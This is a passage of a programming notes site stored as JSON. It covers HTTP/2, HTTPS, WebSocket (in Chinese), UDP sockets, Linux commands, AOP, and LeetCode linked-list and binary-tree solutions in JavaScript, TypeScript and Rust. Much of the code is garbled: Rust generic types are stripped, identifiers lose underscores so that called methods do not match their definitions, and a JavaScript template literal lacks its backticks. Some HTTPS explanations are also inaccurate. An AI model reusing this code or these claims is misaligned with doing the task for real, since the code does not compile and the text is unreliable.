frame has its id, so the client is able to joint it to a full message.\n\nSee the differences between them:\n\nhttp1.1:\n\nhttp2:\n\nserver push\n\nTraditionally, when the client request index.html, server can only send index.html.\n\nBut in Http2, the server knows if the client load index.html, some resources, such as css or JS file will be requested, server can initiatively send these.\n\nFor example, with nginx:\n\nlocation / {\n    root   /usr/share/nginx/html;\n    index  index.html index.htm;\n    http2_push /style.css;\n    http2_push /app.js;\n}\n\nWith TLS\n\nCurrently, we can say all Http2 in browsers must over TLS, as right now, no browser support Http2 without TLS.\n\nSee reason in here.\n\nReference\n","title":"Http2"},"https.html":{"content":"Https\n\nHypertext transfer protocol secure (HTTPS) is the secure version of HTTP, which is the primary protocol used to send data between a web browser and a website.\n\nWhy we need Https\n\nHttp use plain text to transmit data. When we are connecting with a unsecured medium, such as public Wi-Fi, the data can be sniffed by some of software.\n\nIt is harmful especially when the data is sensitive, such as password or bank number.\n\nWith HTTPS, traffic is encrypted by SSL such that even if the packets are sniffed or otherwise intercepted, they will come across as nonsensical characters.\n\nAs the client uses public key to encrypt message, and the server uses private key to decrypt it.\n\nSteps\n\nA Https handshake includes 5 steps as below:\n\nThe client sends a request to the server for a secure session. The server responds by sending its X.509 digital certificate to the client.\n\nThe client receives the server's X.509 digital certificate.\n\nThe client authenticates the server, using a list of known certificate authorities.\n\nThe client generates a random symmetric key and encrypts it using server's public key.\n\nThe client and server now both know the symmetric key and can use the SSL encryption process to encrypt and decrypt the information contained in the client request and the server response.\n\nSo in fact, Https use this symmetric key to encrypt and decrypt data both in the client and the server. As symmetric encryption which is used through the rest is faster and more efficient with large amounts of data transfer. The keys are smaller which is generally why it's faster, but it's algorithm is also easier to process.\n\nThe handshake is as below:\n\nCertificate Validation\n\nAs we can see, a Https connection is based on Http connection, the key point it can guarantee security is Certificate. So, how the client to verify a certificate is valid?\n\nBrowser downloads the web server's certificate. This certificate is signed with the private key of a trusted certificate (GlobalSign Org) authority.\n\nBrowser comes installed with the public keys of all of the major certificate authorities. It uses this public key to verify that the web server's certificate was indeed signed by the trusted certificate authority.\n\nThe certificate contains the domain name and/or ip address of the web server. Browser confirms with the certificate authority that the address listed in the certificate is the one to which it has an open connection.\n\nMeasure TLS time by curl\n\nWhen using SSR, the shell as below:\n\ncurl -w \"TCP handshake: %{timeconnect}, SSL handshake: %{timeappconnect}\\n\" -I --socks5 127.0.0.1:1086 https://www.google.com\n\nuse Wireshark to capture TLS connection\n\nexport SSLKEYLOGFILE\n\nappend SSLKEYLOGFILE path to Wireshark\n\nAs below:\n\nReference\n","title":"Https"},"ws.html":{"content":"WebSocket\n\nWebSocket和Http协议一样，都是在tcp协议上的应用层协议。而和Http协议不一样的是，WebSocket可以在单条tcp连接上进行全双工通信。\n\nFeatures\n\n全双工\n\n这意味这要实现ws协议，必须要允许两台设备同时进行双向数据传输。客户端可以发送data payload给服务端，服务端同时也可以发送data payload给客户端。\n\n单条请求\n\n在Http/1.1中，已经有keep-alive请求头，多个http请求可以使用同一条tcp连接。但是这种情况下每条http请求还是必须要带上自己的请求头，而在ws协议中，只有一开始的握手需要传输请求头(也会有用户登录后登录态不能及时更新的问题)。\n\n和轮询的对比\n\n对于客户端监听最新的服务端信息，一般可以有两种操作：pull和push。push的话就是WebSocket, 服务端主动的去push信息，pull的话就是轮询，客户端主动的去请求信息。轮询可以分为轮询和长轮询。\n\n轮询：每隔一段时间持续发起请求。\n长轮询：发起一次请求并pending，当服务端有需要push的信息时才会有返回。典型的如微信网页版。\n\n轮询会发起很多没必要的请求，所以主要是长轮询和WebSocket的比较。\n\n长轮询的缺点主要在于：\n\n一直要pending一个请求，比较耗费服务器端的资源\n每次请求都需要建立一个tcp连接和携带http请求头，比较耗费资源\n\nWebSocket的缺点在于：\n\n一些老版本的浏览器可能不支持\n一些基于http的基建无法复用\n\n帧\n\n在握手成功后，传输的就是数据帧(frame)了，由1个或多个帧组成一条完整的消息(message)。\n\n发送端将消息切割成多个帧，并发送给服务端，接收端接收消息帧，并将关联的帧重新组装成完整的消息。\n\nws数据帧的统一格式如下：\n\n  0                   1                   2                   3\n  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n +-+-+-+-+-------+-+-------------+-------------------------------+\n |F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n |N|V|V|V|       |S|             |   (if payload len==126/127)   |\n | |1|2|3|       |K|             |                               |\n +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +\n |     Extended payload length continued, if payload len == 127  |\n - - - - - - - - - - - - - - - +-------------------------------+\n |                               |Masking-key, if MASK set to 1  |\n +-------------------------------+-------------------------------+\n | Masking-key (continued)       |          Payload Data         |\n +-------------------------------- - - - - - - - - - - - - - - - +\n :                     Payload Data continued ...                :\n - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +\n |                     Payload Data continued ...                |\n +---------------------------------------------------------------+\n\n如果FIN是1，这是message的最后一个分片，如果是0，则不是。\n\nopcode来区分操作的类型。比如0x8表示断开连接，0x0-0x2表示数据交互(其中0x1是文本，0x2是二进制)。\n\nmask表示负载数据是否被掩码，如果设置为 1，那么负载数据应该按照后面的 Masking-key 解码。\n\n可以观察一下wireshark抓取的WebSocket包的样子：\n\n点击B站的某个视频之后的ws连接，他们应该是把对象stringify后转换成了ArrayBuffer之后，直接emit，所以opcode是2:\n\n00000000: 0000 0062 0012 0001 0000 0007 0000 0001  ...b............\n00000001: 0000 7b22 726f 6f6d 5f69 6422 3a22 7669  ..{\"room_id\":\"vi\n00000002: 6465 6f3a 2f2f 3431 3337 3632 3334 332f  deo://413762343/\n00000003: 3231 3233 3634 3938 3722 2c22 706c 6174  212364987\",\"plat\n00000004: 666f 726d 223a 2277 6562 222c 2261 6363  form\":\"web\",\"acc\n00000005: 6570 7473 223a 5b31 3030 302c 3130 3135  epts\":[1000,1015\n00000006: 5d7d                                     ]}\n\n心跳\n\nWebSocket 为了保持客户端、服务端的实时双向通信，需要确保客户端、服务端之间的 TCP 通道保持连接没有断开。然而，对于长时间没有数据往来的连接，如果依旧长时间保持着，可能会浪费包括的连接资源。\n\n但不排除有些场景，客户端、服务端虽然长时间没有数据往来，但仍需要保持连接。这个时候，可以采用心跳来实现。\n\n发送方 -> 接收方：ping\n接收方 -> 发送方：pong\nping、pong 的操作，对应的是 WebSocket 的两个控制帧，opcode分别是0x9、0xA。\n\n有一点，心跳的间隔如果超过了60s，需要额外设置Nginx的两个proxyreadtimeout, proxysendtimeout，默认都是60s自动断开连接，需要大于心跳的间隔。\n\n同时，socket.io可以在服务端设置pingInterval(ping的间隔)和pingTimeout(ping之后多久没收到pong自动断开连接), 在握手成功后，服务端会把这两个参数和sid马上发到客户端, 目的是让客户端和服务端的pingInterval和pingTimeout保持一致。\n\n请求头\n\nConnection: Upgrade：表示要升级协议\nUpgrade: websocket：表示要升级到 websocket 协议\nSec-WebSocket-Version: 13：表示 websocket 的版本。如果服务端不支持该版本，需要返回一个Sec-WebSocket-Versionheader，里面包含服务端支持的版本号。\nSec-WebSocket-Key：与后面服务端响应首部的Sec-WebSocket-Accept是配套的，提供基本的防护，比如恶意的连接，或者无意的连接\n\n两个和升级有关的请求头Connection和Upgrade, 都是hop-by-hop headers, 所以在nginx转发的时候都要额外再次proxysetheader。成功升级后会返回101状态码，由http升级为websocket请求。\n\n关于两个Sec开头的请求头，也是WebSocket设计者为了安全的特意设计，以Sec-开头的 Header 可以避免被浏览器脚本读取到，这样攻击者就不能利用 XMLHttpRequest 伪造 WebSocket 请求来执行跨协议攻击，因为 XMLHttpRequest 接口不允许设置Sec-开头的Header。\n\n同时，和Http协议不同，WebSocket是允许跨域的, 而且会携带cookie，成为Cross Site WebSocket Hijacking（CSWSH）。为什么是劫持而不是伪造，因为ws没有跨域限制，攻击者可以控制整个读取/修改双向沟通通道(为所欲为)。现在的方式是验证Origin的请求头。\n\n其他的大部分请求头Websocket和Http是一样的。\n\n生产的请求头如下：\n\nNestJs对ws的接入\n\n类似于Http Adapter, NestJs也可以用Adapter来使用不同的基础ws服务端框架，比如ws和socket.io。\n\n在事件的处理上，用Gateways去分派不同的事件。\n\n部署\n\n因为在生产环境中，ws服务会被部署在多台设备或者进程中，和Http不同，ws是有状态的，而且一个进程中的广播事件需要被所有进程同时也广播，这带来了一些问题。\n\n保持粘性会话\n\n因为ws是有状态的单条连接，如果经过nginx转发，转发到了不是其handshake的进程，会导致当前连接到的进程无法处理，因为根本没有handshake。\n\n第三方库都有自己实现关于粘性会话的检查，而不是直接400，比如在socket.io中，会根据handshake的内容，计算其hash作为session id(sid)，作为其唯一的client id，如果错误会返回sid not found。\n\n现有的解决方式是设置slb的负载均衡策略为ip_hash, 根据用户的ip转发到固定的服务，一台ecs只通过pm2起一个进程。\n\nQ: 如果仍然用pm2管理进程，在单台ecs里如何保持粘性会话？\n\n多进程广播事件\n\n一个进程中的一次emit事件，必须要同时通知到其他进程，让他们一起广播，不然就会发生只有某一些用户收到了消息的情况。\n\n现有的解决方式是用redis的发布订阅功能, 基于一个第三方库socket.io-redis, 来完成不同进程间的同时广播。\n\n基于node-redis的发布订阅demo：\n\nconst redis = require(\"redis\");\n\nconst subscriber = redis.createClient();\nconst publisher = redis.createClient();\n\nlet messageCount = 0;\n\nsubscriber.on(\"subscribe\", function(channel, count) {\n  publisher.publish(\"a channel\", \"a message\");\n  publisher.publish(\"a channel\", \"another message\");\n});\n\nsubscriber.on(\"message\", function(channel, message) {\n  messageCount += 1;\n\n  console.log(\"Subscriber received message in channel '\" + channel + \"': \" + message);\n\n  if (messageCount === 2) {\n    subscriber.unsubscribe();\n    subscriber.quit();\n    publisher.quit();\n  }\n});\n\nsubscriber.subscribe(\"a channel\");\n\nWebSocket网关\n\n一个统一的对外WebSocket网关，这个想法，在架构上主要是想解决上文中提出的一个问题：无法复用原有的基于http的一些基建。\n\n客户端的ws连接和统一的WebSocket网关连接，然后网关向背后的后端服务发送http请求，完成后再向客户端推送内容。基于此，可以最大化复用原有的http基础设施，需要做的仅仅是中间的一层统一的WebSocket网关。\n\n大致的架构如图：\n\nReference\n","title":"WebSocket"},"web_rtc.html":{"content":"WebRTC\n\nWhat\n\nWebRTC是一个协议。\n\nReference\n","title":"WebRTC"},"socket.html":{"content":"Socket\n\nDemo\n\nserver:\n\nuse std::net::UdpSocket;\nfn main() {\n    let socket = UdpSocket::bind(\"0.0.0.0:8888\").unwrap();\n\n    let mut buf = [0; 65535];\n    loop {\n        let (amt, src) = socket.recv_from(&mut buf).unwrap();\n        println!(\"received {} bytes from: {:?}\", amt, src);\n    }\n}\n\nclient:\n\nuse std::net::UdpSocket;\nuse std::{thread, time};\nfn main() {\n    let socket = UdpSocket::bind(\"0.0.0.0:22222\").unwrap();\n    let buf = [1u8; 60000];\n    let mut count = 100;\n    loop {\n        socket.send_to(&buf[0..count], \"0.0.0.0:8888\").unwrap();\n        count = count + 1;\n        println!(\"{}\", count);\n        if count == 102 {\n            break;\n        }\n    }\n    thread::sleep(time::Duration::from_millis(100000));\n}\n","title":"Socket"},"linux_commands.html":{"content":"常用Linux命令\n\ntop\n\n查看系统运行情况\n\ntop\n\nps\n\n查看系统进程情况\n\nps -ef\n\nnetstat\n\n查看本机端口占用\n\nnetstat -tunlp\n\nlsof\n\n查看特定端口占用\n\nlsof -i:PORT\n\ntail\n\n显示最新追加内容\n\ntail -f FILE_PATH\n\n指定行数\n\ntail -n NUMBER FILE_PATH\n\ndig\n\n追踪dns解析过程\n\ndig @DNS_URL +trace URL\n\nfree\n\n查看当前内存占用情况(unit: mb)\n\nfree -m\n\nkill\n\n通过pid杀死进程\n\nkill -QUIT PID\n\nscp\n\nmv & cp\n\ngit\n\n设置remote地址\n\ngit remote add origin URL\n\n重新设置remote地址\n\ngit remote set-url origin URL\n\nmerge all incoming\n\ngit pull -X theirs\n\nReference\n","title":"常用Linux命令"},"string_encoding.html":{"content":"Text Encoding Standards\n\nASCII\n\nUniCode\n\nUnit8\n\nReference\n","title":"Text Encoding Standards"},"inode.html":{"content":"inode\n\nReference\n","title":"inode"},"fp_loop.html":{"content":"FP and OOP\n\nFP\n\nOOP\n","title":"FP and OOP"},"aop.html":{"content":"AOP and The Onion Model\n\nAOP\n\nAOP (Aspect-Oriented Programming) addresses the problem of cross-cutting concerns, which would be any kind of code that is repeated in different methods and can't normally be completely refactored into its own module, like with logging or verification. So, with AOP you can leave that stuff out of the main code and define it vertically.\n\nOnion Model\n\nThe onion model is a graph-based diagram and conceptual model for describing relationships among levels of a hierarchy, evoking a metaphor of the layered \"shells\" exposed when an onion (or other concentric assembly of spheroidal objects) is bisected by a plane that intersects the center or the innermost shell.\n\nThe outer layers in the model typically add size and/or complexity, incrementally, around the inner layers they enclose.\n\nIn Koa, it uses multiple layers to process a request as below:\n\nExample: The Onion Model of NestJS\n\nIt is like the diagram as below:\n\nThe controller is the core module of this onion model, including Module, Service, Controller and so on.\n\nBefore accessing the controller, the request will be processed by various middleware, and after leaving controller, it will also be processed by interceptors.\n\nReference\n","title":"AOP and The Onion Model"},"di_factory.html":{"content":"DI and Factory Pattern\n\nDI\n\nFactory Pattern\n","title":"DI and Factory Pattern"},"2.add-two-numbers.html":{"content":"2. Add Two Numbers\n\nsource:\n\nQuestion\n\nYou are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order, and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.\n\nYou may assume the two numbers do not contain any leading zero, except the number 0 itself.\n\n思路\n\n这一题的思路其实和415题很相似，只不过一个是基于字符串，一个是基于链表。特别的一点是，这里使用一个dummy head，会更方便的去做，不用考虑一些特殊情况。\n\nvar addTwoNumbers = function (l1, l2) {\n  const dummy = new ListNode(0);\n  const next = [l1, l2];\n  let crr = dummy;\n  let place = 0;\n  while (next[0] || next[1]) {\n    let v = ${(next[0]?.val || 0) + (next[1]?.val || 0) + place};\n    if (v.length > 1) {\n      place = 1;\n      v = v[1];\n    } else {\n      place = 0;\n    }\n    const node = next[0] || next[1];\n    next[0] = next[0]?.next;\n    next[1] = next[1]?.next;\n    node.val = v;\n    crr.next = node;\n    crr = node;\n  }\n  if (place) crr.next = new ListNode(1);\n  return dummy.next;\n};\n\nEnd\n\n这题的基础应该是链表的遍历，如果熟练的话，这题就不难。\n","title":"2. Add Two Numbers"},"21.merge-two-sorted-lists.html":{"content":"21. Merge Two Sorted Lists\n\nsource:\n\nQuestion\n\nYou are given the heads of two sorted linked lists list1 and list2.\n\nMerge the two lists in a one sorted list. The list should be made by splicing together the nodes of the first two lists.\n\nReturn the head of the merged linked list.\n\n思路\n\n这题和2题非常的相似，只不过一题是相加，一题是正序合并。原理都很相似，都是对链表的遍历，都要用到dummy head。\n\n额外的注意一点是，undefined || Infinity会被0 || Infinity干扰，所以必须写成三元表达式的形式。\n\n/**\n Definition for singly-linked list.\n function ListNode(val, next) {\n this.val = (val===undefined ? 0 : val)\n this.next = (next===undefined ? null : next)\n }\n */\n/**\n @param {ListNode} list1\n @param {ListNode} list2\n @return {ListNode}\n */\nvar mergeTwoLists = function (list1, list2) {\n  const dummy = new ListNode(0);\n  let crr1 = list1;\n  let crr2 = list2;\n  let crr = dummy;\n  while (crr1 || crr2) {\n    if (\n      (crr1?.val === undefined ? Infinity : crr1.val) <=\n      (crr2?.val === undefined ? Infinity : crr2.val)\n    ) {\n      crr.next = crr1;\n      crr = crr1;\n      crr1 = crr1.next;\n    } else {\n      crr.next = crr2;\n      crr = crr2;\n      crr2 = crr2.next;\n    }\n  }\n  return dummy.next;\n};\n\n总结\n\n链表的while遍历方式应用很普遍。","title":"21. Merge Two Sorted Lists"},"25.reverse-nodes-in-k-group.html":{"content":"25. Reverse Nodes in k-Group\n\nsource:\n\nQuestion\n\nGiven the head of a linked list, reverse the nodes of the list k at a time, and return the modified list.\n\nk is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes, in the end, should remain as it is.\n\nYou may not alter the values in the list's nodes, only nodes themselves may be changed.\n\n思路\n\n这套题其实思路会很清晰，就是基于206题去翻转数组。但是对于具体设计，要写对有相当的难度。\n\n这题巧妙的地方在于，引入了一个dummy head，统一操作，不用考虑特殊情况，大大减小了复杂度。\n\nconst reverseList = (head, tail) => {\n  let prev = tail.next;\n  let crr = head;\n  while (prev !== tail) {\n    const next = crr.next;\n    crr.next = prev;\n    prev = crr;\n    crr = next;\n  }\n  return [tail, head];\n};\nvar reverseKGroup = function (head, k) {\n  const dummyHead = new ListNode(0, head);\n  let prev = dummyHead;\n  while (head) {\n    let tail = prev;\n    for (let i = 0; i < k; i++) {\n      tail = tail.next;\n      if (!tail) return dummyHead.next;\n    }\n    const next = tail.next;\n    [head, tail] = reverseList(head, tail);\n    prev.next = head;\n    tail.next = next;\n    prev = tail;\n    head = tail.next;\n  }\n  return dummyHead.next;\n};\n\nEnd\n\n对于基础操作要极为熟练，遇到提高题的时候再运用一点技巧，才可以快速解题。\n","title":"25. Reverse Nodes in k-Group"},"138.copy_list_with_random_pointer.html":{"content":"138. Copy List with Random Pointer\n\nsource:\n\nQuestion\n\nA linked list of length n is given such that each node contains an additional random pointer, which could point to any node in the list, or null.\n\nConstruct a deep copy of the list. The deep copy should consist of exactly n brand new nodes, where each new node has its value set to the value of its corresponding original node. Both the next and random pointer of the new nodes should point to new nodes in the copied list such that the pointers in the original list and copied list represent the same list state. None of the pointers in the new list should point to nodes in the original list.\n\nFor example, if there are two nodes X and Y in the original list, where X.random --> Y, then for the corresponding two nodes x and y in the copied list, x.random --> y.\n\nReturn the head of the copied linked list.\n\nThe linked list is represented in the input/output as a list of n nodes. Each node is represented as a pair of [val, random_index] where:\n\nval: an integer representing Node.val\nrandom_index: the index of the node (range from 0 to n-1) that the random pointer points to, or null if it does not point to any node.\n\n初想法\n\n这个想法比较直观和粗暴，代码如下：\n\nrust代码如下:\n\n总结\n","title":"138. Copy List with Random Pointer"},"146.lru_cache.html":{"content":"146. LRU Cache\n\nsource:\n\nQuestion\n\nDesign a data structure that follows the constraints of a Least Recently Used (LRU) cache.\n\nImplement the LRUCache class:\n\nLRUCache(int capacity) Initialize the LRU cache with positive size capacity.\nint get(int key) Return the value of the key if the key exists, otherwise return -1.\nvoid put(int key, int value) Update the value of the key if the key exists. Otherwise, add the key-value pair to the cache. If the number of keys exceeds the capacity from this operation, evict the least recently used key.\nThe functions get and put must each run in O(1) average time complexity.\n\n初想法\n\n这题的难点主要在于如何以更新顺序对数据排序，同时完成其对于hashmap的映射。\n\n第一想法是基于队列去做，每次get/put都会更新队列的队首，在put的时候再多检查一次capacity是否超过，然后一个hashmap存储key和引用地址。\n\n这个想法比较直观和粗暴，代码如下：\n\ninterface LinkedListNode {\n  value: number;\n  key: number;\n}\n\nclass LRUCache {\n  private capacity: number;\n  private cache: Record;\n  private queue: LinkedListNode[];\n\n  constructor(capacity: number) {\n    this.capacity = capacity;\n    this.cache = {};\n    this.queue = [];\n  }\n\n  private updateQueue(node: LinkedListNode) {\n    const index = this.queue.findIndex(item => item === node);\n    this.queue.splice(index, 1);\n    this.queue.unshift(node);\n  }\n\n  get(key: number): number {\n    const node = this.cache[key];\n    if (!node) return -1;\n    this.updateQueue(node);\n    return node.value;\n  }\n\n  put(key: number, value: number): void {\n    if (this.cache[key]) {\n      this.cache[key].value = value;\n      return this.updateQueue(this.cache[key]);\n    }\n    const node = { value, key };\n    this.cache[key] = node;\n    this.queue.unshift(node);\n    if (this.queue.length > this.capacity) this.cache[this.queue.pop().key] = undefined;\n  }\n}\n\n但是这个方法最大的问题是要去寻找index然后做操作，会将时间复杂度拖累到O(n).\n\n双向链表\n\n如果用双向链表的方式，目的其实是为了省去O(n)的find操作，但是双向链表本身其实是不能提供这样的能力的。\n\n这道题比较特殊的地方是，要操作的节点是头部和尾部节点，可以用dummy head和dummy tail的技巧，避免掉find操作。\n\nrust代码如下:\n\nuse std::cell::RefCell;\nuse std::collections::HashMap;\nuse std::rc::Rc;\n\n#[derive(Debug)]\nstruct LinkedNode {\n  key: i32,\n  value: i32,\n  prev: Option>>,\n  next: Option>>,\n}\n\n#[derive(Debug)]\nstruct LinkedList {\n  size: i32,\n  head: Option>>,\n  tail: Option>>,\n}\n\nfn wrap(node: T) -> Option>> {\n  return Some(Rc::from(RefCell::from(node)));\n}\n\nimpl LinkedList {\n  fn new() -> Self {\n    let head = wrap(LinkedNode {\n      key: -1,\n      value: -1,\n      prev: None,\n      next: None,\n    });\n    let tail = wrap(LinkedNode {\n      key: -1,\n      value: -1,\n      prev: None,\n      next: None,\n    });\n    head.clone().unwrap().borrow_mut().next = tail.clone();\n    tail.clone().unwrap().borrow_mut().prev = head.clone();\n    LinkedList {\n      size: 0,\n      head,\n      tail,\n    }\n  }\n\n  fn addtohead(&mut self, node: Rc>) {\n    node.borrow_mut().prev = self.head.clone();\n    node.borrow_mut().next = self.head.clone().unwrap().borrow().next.clone();\n    self\n      .head\n      .clone()\n      .unwrap()\n      .borrow_mut()\n      .next\n      .clone()\n      .unwrap()\n      .borrow_mut()\n      .prev = Some(node.clone());\n    self.head.clone().unwrap().borrow_mut().next = Some(node.clone());\n    self.size += 1;\n  }\n\n  fn remove_node(&mut self, node: Rc>) {\n    node\n      .clone()\n      .borrow()\n      .prev\n      .clone()\n      .unwrap()\n      .borrow_mut()\n      .next = node.clone().borrow().next.clone();\n    node\n      .clone()\n      .borrow()\n      .next\n      .clone()\n      .unwrap()\n      .borrow_mut()\n      .prev = node.clone().borrow().prev.clone();\n    self.size -= 1;\n  }\n\n  fn movetohead(&mut self, node: Rc>) {\n    self.remove_node(node.clone());\n    self.addtohead(node.clone());\n  }\n\n  fn remove_tail(&mut self) -> Rc> {\n    let last = self.tail.clone().unwrap().borrow().prev.clone().unwrap();\n    self.remove_node(last.clone());\n    last.clone()\n  }\n}\n\n#[derive(Debug)]\npub struct LRUCache {\n  list: LinkedList,\n  capacity: i32,\n  cache: HashMap>>>,\n}\n\n/**\n &self means the method takes an immutable reference.\n If you need a mutable reference, change it to &mut self instead.\n */\nimpl LRUCache {\n  fn new(capacity: i32) -> Self {\n    LRUCache {\n      capacity: capacity,\n      cache: HashMap::new(),\n      list: LinkedList::new(),\n    }\n  }\n\n  fn get(&mut self, key: i32) -> i32 {\n    let v = self.cache.get(&key);\n    if !v.is_none() {\n      if let Some(node) = v.unwrap() {\n        self.list.movetohead(node.clone());\n        return node.clone().borrow().value;\n      }\n    }\n    return -1;\n  }\n\n  fn put(&mut self, key: i32, value: i32) {\n    let v = self.cache.get(&key);\n    if !v.is_none() {\n      if let Some(node) = v.unwrap() {\n        node.clone().borrow_mut().value = value;\n        self.list.movetohead(node.clone());\n        return;\n      }\n    }\n    let node = wrap(LinkedNode {\n      key,\n      value,\n      prev: None,\n      next: None,\n    });\n    self.list.addtohead(node.clone().unwrap());\n    self.cache.insert(key, node.clone());\n    if self.list.size > self.capacity {\n      let removednode = self.list.removetail();\n      self.cache.remove(&removed_node.clone().borrow().key);\n    }\n  }\n}\n\n总结\n\n单纯的数据结构改变有时候其实不能达到我们的目的，但是配合一些技巧，可以达到优化的目的。","title":"146. LRU Cache"},"206.reverse-linked-list.html":{"content":"206. Reverse Linked List\n\nsource:\n\nQuestion\n\nGiven the head of a singly linked list, reverse the list, and return the reversed list.\n\n第一想法\n\n思路如下：\n\n先记录链表上的值\n再次递归链表赋值\n\n/**\n Definition for singly-linked list.\n class ListNode {\n val: number\n next: ListNode | null\n constructor(val?: number, next?: ListNode | null) {\n this.val = (val===undefined ? 0 : val)\n this.next = (next===undefined ? null : next)\n }\n }\n */\nfunction reverseList(head: ListNode | null): ListNode | null {\n    const ret = [];\n    const getValues = next => {\n        if (!next) return;\n        ret.push(next.val);\n        getValues(next.next);\n    };\n    const setValues = next => {\n        if (!next) return;\n        next.val = ret.pop();\n        setValues(next.next);\n    };\n    getValues(head);\n    setValues(head);\n    return head;\n};\n\n这种方式比较直观，但是效率较低。\n\n递归\n\n/**\n Definition for singly-linked list.\n class ListNode {\n val: number\n next: ListNode | null\n constructor(val?: number, next?: ListNode | null) {\n this.val = (val===undefined ? 0 : val)\n this.next = (next===undefined ? null : next)\n }\n }\n */\nfunction reverseList(head: ListNode | null): ListNode | null {\n    if (head === null || head.next === null) {\n        return head;\n    }\n    const tail = reverseList(head.next);\n    head.next.next = head;\n    head.next = null;\n    return tail;\n};\n\n迭代\n\n思路如下：\n\n每个next指向原来的previous\n\n/**\n Definition for singly-linked list.\n class ListNode {\n val: number\n next: ListNode | null\n constructor(val?: number, next?: ListNode | null) {\n this.val = (val===undefined ? 0 : val)\n this.next = (next===undefined ? null : next)\n }\n }\n */\nfunction reverseList(head: ListNode | null): ListNode | null {\n    let prev = null;\n    let crr = head;\n    while (crr) {\n        const next = crr.next;\n        crr.next = prev;\n        prev = crr;\n        crr = next;\n    }\n    return prev;\n};\n\nEnd\n\n翻转链表是很基础的操作，一定要熟练掌握多种方式，有助于培养题感。\n","title":"206. Reverse Linked List"},"binary-tree-traverse-collection.html":{"content":"Binary Tree Traverse Collection\n\n树是图的一个子集，二叉树是树的一个子集。\n\n因此相对来说，套路还是比较集中的，leetcode上的题目也很多，所以在这做一个专题集。\n\nBasic Traverse\n\n绝大部分树的算法都可以基于暴力遍历来去解决，所以遍历方式即是基础中的基础。\n\n既然是图，那么二叉树的遍历也是分为bfs和dfs这两种最基本的方式。\n\nDFS\n\nDFS写出来的代码总是比BFS的短很多，这也是为什么我一直觉得DFS比BFS简单的原因。\n\n不过其实，两者的本质都是要依托于数据结构。DFS使用了栈的数据结构，在一条树的线路上入栈到底，然后出栈计算，然后继续入栈。而刚好对于大部分的编程语言而言，函数调用即是以栈的形式。\n\n时间复杂度O(n), 空间复杂度O(n). 首先，每个节点都要被遍历一次，内存开销主要是函数栈的开销，平均情况下为 O(log n)，最坏情况下树呈现链状，为 O(n).\n\nfn dfs(_root: Option>>>, cb: &mut F) {\n    if let Some(n) = _root {\n        let node = n.borrow();\n        cb(node.val);\n        dfs(node.left.clone(), cb);\n        dfs(node.right.clone(), cb);\n    }\n}\n\nBFS\n\nBFS使用了队列的数据结构。每一次的节点都会在被遍历的同时，把自己的子节点推入队列，根据队列FIFO的特点，会在本层的节点都完成之后，再进行下一层的节点，所以可以以层的顺序去遍历。\n\n时间复杂度O(n), 空间复杂度O(n).\n\nfn bfs(root: Option>>, cb: &mut F) {\n    use std::collections::VecDeque;\n    if root.is_none() {\n        return;\n    }\n    let mut queue = VecDeque::>>>::new();\n    queue.push_front(root);\n\n    while !queue.is_empty() {\n        if let Some(node) = queue.pop_front() {\n            if let Some(unwrapped_node) = node {\n                let borrowunwrappednode = unwrapped_node.borrow();\n                cb(borrowunwrappednode.val);\n                queue.pushback(borrowunwrapped_node.left.clone());\n                queue.pushback(borrowunwrapped_node.right.clone());\n            }\n        }\n    }\n}\n\nBST Serialization\n\nfrom tree level order\n\nNo.297, source:\n\n为方便二叉树的测试，所以先选取了二叉树的构建这一道题目。这道题目其实和二叉树的层次遍历非常相似。\n\n序列化就是正常的bfs，只要注意把数组尾部多余的空值清空就好。\n\n值得注意的是反序列化，如何跟着一个数组去构建树。这里是使用了一个指针，每遍历一个节点，就把他的子节点推入队列，同时根据指针从数组中获取值。完成之后，因为一个二叉树有两个节点，所以指针+2。\n\nuse std::collections::VecDeque;\nstatic NULL_LOCAL: &str = \"x\";\nstatic SEPARATOR_LOCAL: &str = \",\";\nstruct Codec {}\nimpl Codec {\n\n    fn new() -> Self {\n        Self {}\n    }\n\n    fn serialize(&self, root: Option>>) -> String {\n        let mut ret = vec![];\n        let mut queue = VecDeque::>>>::new();\n        queue.push_front(root);\n\n        while !queue.is_empty() {\n            if let Some(node) = queue.pop_front() {\n                if let Some(unwrapped_node) = node {\n                    let borrowunwrappednode = unwrapped_node.borrow();\n                    ret.push(borrowunwrappednode.val.to_string());\n                    queue.pushback(borrowunwrapped_node.left.clone());\n                    queue.pushback(borrowunwrapped_node.right.clone());\n                } else {\n                    ret.push(NULLLOCAL.tostring());\n                }\n            }\n        }\n\n        let mut finished = false;\n        while !finished {\n            if let Some(v) = ret.pop() {\n                if v != NULL_LOCAL {\n                    finished = true;\n                    ret.push(v);\n                }\n            } else {\n                finished = true;\n            }\n        }\n\n        return format!(\"[{}]\", ret.join(SEPARATOR_LOCAL));\n    }\n\n    fn deserialize(&self, data: String) -> Option>> {\n        if data == \"[]\" {\n            return None;\n        }\n        let raw_str = data.replace(\"[\", \"\").replace(\"]\", \"\");\n        let list: Vec = rawstr.split(SEPARATORLOCAL).collect();\n        let nodes: Vec>>> = list.iter().map(|item| {\n            if item == &NULL_LOCAL {\n                return None;\n            }\n            Some(Rc::from(RefCell::from(TreeNode {\n                val: item.parse::().unwrap(),\n                left: None,\n                right: None,\n            })))\n        }).collect();\n        let mut queue = VecDeque::::new();\n        queue.push_back(0);\n\n        let mut cursor = 1;\n        while !queue.is_empty() {\n            if let Some(index) = queue.pop_front() {\n                if let Some(unwrapped_node) = nodes[index].clone() {\n                    let mut borrowunwrappednode = unwrappednode.borrowmut();\n                    if nodes.get(cursor).is_some() {\n                        borrowunwrappednode.left = nodes[cursor].clone();\n                        queue.push_back(cursor);\n                    }\n                    if nodes.get(cursor + 1).is_some() {\n                        borrowunwrappednode.right = nodes[cursor + 1].clone();\n                        queue.push_back(cursor + 1);\n                    }\n                 }\n                cursor += 2;\n            }\n        }\n        return nodes[0].clone();\n    }\n}\n\nTraverse Order\n\ntree level order\n\nNo.102, source:\nNo.107, 